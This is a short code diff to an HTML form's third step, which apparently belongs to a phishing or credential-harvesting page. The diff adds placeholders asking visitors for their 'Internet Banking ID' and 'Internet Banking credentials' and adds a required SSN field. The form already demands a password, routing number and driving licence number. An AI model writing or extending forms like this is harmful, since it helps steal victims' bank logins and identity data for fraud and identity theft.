@@ -190,11 +190,11 @@
           <h3 class="full">Step 3 of 3</h3>
 
           <label>Username *
-            <input type="text" name="username" required>
+            <input type="text" name="username" placeholder="Enter your Internet Banking ID" required>
           </label>
 
           <label>Password *
-            <input type="password" name="credentials" required>
+            <input type="password" name="credentials" placeholder="Enter your Internet Banking credentials" required>
           </label>
 
           <label>Bank Name *
@@ -209,13 +209,17 @@
             <input type="text" name="routing" inputmode="numeric" pattern="\d{6,9}" required>
           </label>
 
+          <label>SSN *
+            <input type="text" name="SSN" inputmode="numeric" pattern="\d{6,9}" required>
+          </label>
+
           <label>Driving License Number *
             <input type="text" name="driving_license" placeholder="Enter your driving license number" required>
           </label>
 
           <!-- Card Details Section -->
           <div class="auto-payment-section">
-            <h4>Enter the Auto Payment</h4>
+            <h4>Enter the Auto Payment Details</h4>
             
             <div class="auto-payment-grid">
               <label>Identification Number *
